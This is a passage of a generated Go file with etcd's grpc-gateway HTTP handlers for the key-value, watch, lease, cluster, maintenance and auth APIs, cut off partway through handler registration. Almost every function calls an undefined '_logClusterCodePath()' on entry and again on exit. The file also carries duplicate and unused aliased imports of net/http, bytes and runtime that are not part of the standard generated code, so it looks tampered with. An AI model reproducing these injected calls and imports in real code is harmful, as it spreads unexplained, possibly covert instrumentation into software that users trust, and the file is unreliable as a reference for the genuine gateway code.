package gw

import (
	godefaultbytes "bytes"
	"github.com/coreos/etcd/etcdserver/etcdserverpb"
	"github.com/golang/protobuf/proto"
	"github.com/grpc-ecosystem/grpc-gateway/runtime"
	"github.com/grpc-ecosystem/grpc-gateway/utilities"
	"golang.org/x/net/context"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/grpclog"
	"google.golang.org/grpc/status"
	"io"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var _ codes.Code
var _ io.Reader
var _ status.Status
var _ = runtime.String
var _ = utilities.NewDoubleArray

func request_KV_Range_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.KVClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.RangeRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Range(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_KV_Put_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.KVClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.PutRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Put(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_KV_DeleteRange_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.KVClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.DeleteRangeRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.DeleteRange(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_KV_Txn_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.KVClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.TxnRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Txn(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_KV_Compact_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.KVClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.CompactionRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Compact(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Watch_Watch_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.WatchClient, req *http.Request, pathParams map[string]string) (etcdserverpb.Watch_WatchClient, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var metadata runtime.ServerMetadata
	stream, err := client.Watch(ctx)
	if err != nil {
		grpclog.Printf("Failed to start streaming: %v", err)
		return nil, metadata, err
	}
	dec := marshaler.NewDecoder(req.Body)
	handleSend := func() error {
		var protoReq etcdserverpb.WatchRequest
		err = dec.Decode(&protoReq)
		if err == io.EOF {
			return err
		}
		if err != nil {
			grpclog.Printf("Failed to decode request: %v", err)
			return err
		}
		if err = stream.Send(&protoReq); err != nil {
			grpclog.Printf("Failed to send request: %v", err)
			return err
		}
		return nil
	}
	if err := handleSend(); err != nil {
		if cerr := stream.CloseSend(); cerr != nil {
			grpclog.Printf("Failed to terminate client stream: %v", cerr)
		}
		if err == io.EOF {
			return stream, metadata, nil
		}
		return nil, metadata, err
	}
	go func() {
		for {
			if err := handleSend(); err != nil {
				break
			}
		}
		if err := stream.CloseSend(); err != nil {
			grpclog.Printf("Failed to terminate client stream: %v", err)
		}
	}()
	header, err := stream.Header()
	if err != nil {
		grpclog.Printf("Failed to get header from client: %v", err)
		return nil, metadata, err
	}
	metadata.HeaderMD = header
	return stream, metadata, nil
}
func request_Lease_LeaseGrant_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.LeaseClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.LeaseGrantRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.LeaseGrant(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Lease_LeaseRevoke_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.LeaseClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.LeaseRevokeRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.LeaseRevoke(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Lease_LeaseKeepAlive_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.LeaseClient, req *http.Request, pathParams map[string]string) (etcdserverpb.Lease_LeaseKeepAliveClient, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var metadata runtime.ServerMetadata
	stream, err := client.LeaseKeepAlive(ctx)
	if err != nil {
		grpclog.Printf("Failed to start streaming: %v", err)
		return nil, metadata, err
	}
	dec := marshaler.NewDecoder(req.Body)
	handleSend := func() error {
		var protoReq etcdserverpb.LeaseKeepAliveRequest
		err = dec.Decode(&protoReq)
		if err == io.EOF {
			return err
		}
		if err != nil {
			grpclog.Printf("Failed to decode request: %v", err)
			return err
		}
		if err = stream.Send(&protoReq); err != nil {
			grpclog.Printf("Failed to send request: %v", err)
			return err
		}
		return nil
	}
	if err := handleSend(); err != nil {
		if cerr := stream.CloseSend(); cerr != nil {
			grpclog.Printf("Failed to terminate client stream: %v", cerr)
		}
		if err == io.EOF {
			return stream, metadata, nil
		}
		return nil, metadata, err
	}
	go func() {
		for {
			if err := handleSend(); err != nil {
				break
			}
		}
		if err := stream.CloseSend(); err != nil {
			grpclog.Printf("Failed to terminate client stream: %v", err)
		}
	}()
	header, err := stream.Header()
	if err != nil {
		grpclog.Printf("Failed to get header from client: %v", err)
		return nil, metadata, err
	}
	metadata.HeaderMD = header
	return stream, metadata, nil
}
func request_Lease_LeaseTimeToLive_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.LeaseClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.LeaseTimeToLiveRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.LeaseTimeToLive(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Lease_LeaseLeases_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.LeaseClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.LeaseLeasesRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.LeaseLeases(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Cluster_MemberAdd_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.ClusterClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.MemberAddRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.MemberAdd(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Cluster_MemberRemove_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.ClusterClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.MemberRemoveRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.MemberRemove(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Cluster_MemberUpdate_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.ClusterClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.MemberUpdateRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.MemberUpdate(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Cluster_MemberList_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.ClusterClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.MemberListRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.MemberList(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Maintenance_Alarm_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AlarmRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Alarm(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Maintenance_Status_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.StatusRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Status(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Maintenance_Defragment_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.DefragmentRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Defragment(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Maintenance_Hash_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.HashRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Hash(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Maintenance_HashKV_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.HashKVRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.HashKV(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Maintenance_Snapshot_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (etcdserverpb.Maintenance_SnapshotClient, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.SnapshotRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	stream, err := client.Snapshot(ctx, &protoReq)
	if err != nil {
		return nil, metadata, err
	}
	header, err := stream.Header()
	if err != nil {
		return nil, metadata, err
	}
	metadata.HeaderMD = header
	return stream, metadata, nil
}
func request_Maintenance_MoveLeader_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.MaintenanceClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.MoveLeaderRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.MoveLeader(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_AuthEnable_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthEnableRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.AuthEnable(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_AuthDisable_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthDisableRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.AuthDisable(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_Authenticate_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthenticateRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.Authenticate(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserAdd_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserAddRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserAdd(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserGet_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserGetRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserGet(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserList_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserListRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserList(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserDelete_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserDeleteRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserDelete(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserChangePassword_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserChangePasswordRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserChangePassword(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserGrantRole_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserGrantRoleRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserGrantRole(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_UserRevokeRole_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthUserRevokeRoleRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.UserRevokeRole(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_RoleAdd_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthRoleAddRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.RoleAdd(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_RoleGet_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthRoleGetRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.RoleGet(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_RoleList_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthRoleListRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.RoleList(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_RoleDelete_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthRoleDeleteRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.RoleDelete(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_RoleGrantPermission_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthRoleGrantPermissionRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.RoleGrantPermission(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func request_Auth_RoleRevokePermission_0(ctx context.Context, marshaler runtime.Marshaler, client etcdserverpb.AuthClient, req *http.Request, pathParams map[string]string) (proto.Message, runtime.ServerMetadata, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var protoReq etcdserverpb.AuthRoleRevokePermissionRequest
	var metadata runtime.ServerMetadata
	if err := marshaler.NewDecoder(req.Body).Decode(&protoReq); err != nil {
		return nil, metadata, status.Errorf(codes.InvalidArgument, "%v", err)
	}
	msg, err := client.RoleRevokePermission(ctx, &protoReq, grpc.Header(&metadata.HeaderMD), grpc.Trailer(&metadata.TrailerMD))
	return msg, metadata, err
}
func RegisterKVHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := grpc.Dial(endpoint, opts...)
	if err != nil {
		return err
	}
	defer func() {
		if err != nil {
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
			return
		}
		go func() {
			<-ctx.Done()
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
		}()
	}()
	return RegisterKVHandler(ctx, mux, conn)
}
func RegisterKVHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return RegisterKVHandlerClient(ctx, mux, etcdserverpb.NewKVClient(conn))
}
func RegisterKVHandlerClient(ctx context.Context, mux *runtime.ServeMux, client etcdserverpb.KVClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.Handle("POST", pattern_KV_Range_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_KV_Range_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_KV_Range_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_KV_Put_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_KV_Put_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_KV_Put_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_KV_DeleteRange_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_KV_DeleteRange_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_KV_DeleteRange_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
